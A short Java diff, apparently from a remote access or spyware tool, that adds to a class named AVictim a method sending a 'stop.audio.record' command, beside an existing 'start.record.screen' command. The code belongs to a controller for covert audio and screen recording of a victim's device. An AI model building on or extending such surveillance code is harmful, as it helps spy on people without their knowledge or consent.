@@ -56,6 +56,13 @@ public class AVictim extends Victim {
         sendMessage(query);
     }
 
+    public void sendStopAudioRecord(String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "stop.audio.record");
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
     public void sendStartRecordScreen(String path, long seconds, String owner) {
         JSONObject query = new JSONObject();
         query.put("action", "start.record.screen");
